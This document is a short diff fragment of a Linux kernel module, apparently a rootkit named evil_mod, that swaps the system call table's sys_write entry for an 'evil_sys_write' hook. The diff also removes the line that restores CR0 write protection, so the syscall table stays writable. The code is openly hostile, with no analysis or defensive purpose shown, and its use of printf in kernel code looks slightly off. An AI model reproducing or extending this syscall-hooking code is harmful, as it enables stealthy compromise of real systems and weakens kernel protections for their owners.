@@ -43,14 +43,11 @@ static int __init evil_mod_init (void)
 	} else {
 		/* Yay */
 
-		/* Replace sys_write with evil sys_write*/
+		/* Replace sys_write with evil sys_write */
 		old_sys_write = replace_syscall(sys_call_table, __NR_write, evil_sys_write);
 
 		printf("replaced sys_write (%p) with evil_sys_write" \
 			       " (%p)\n", old_sys_write, evil_sys_write);
-
-		/* Disable write for syscall table */
-		write_cr0(read_cr0() | 0x10000);
 
 		return 0;
 	}
